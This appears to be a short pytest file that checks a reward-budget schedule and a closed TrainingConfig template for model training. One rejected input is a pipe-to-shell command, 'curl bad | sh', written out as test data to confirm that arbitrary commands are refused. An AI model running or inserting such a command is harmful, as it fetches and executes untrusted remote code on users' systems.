import pytest
from heyuna.protocol import PERIODS, REWARD_POOL, TrainingConfig, weekly_budget
from pydantic import ValidationError


def test_exact_total_and_carryover_cap():
    assert sum(weekly_budget(e) for e in range(PERIODS)) == REWARD_POOL
    assert max(weekly_budget(e) for e in range(PERIODS)) - min(weekly_budget(e) for e in range(PERIODS)) <= 1
    assert weekly_budget(520) == (REWARD_POOL + 519) // 520
    with pytest.raises(ValueError):
        weekly_budget(-1)


@pytest.mark.parametrize('kwargs', [{'rank': 16}, {'scale': 2}, {'steps': 0}, {'steps': 51},
                                    {'command': 'curl bad | sh'}, {'learning_rate': float('nan')}])
def test_closed_training_template(kwargs):
    with pytest.raises(ValidationError):
        TrainingConfig(**kwargs)
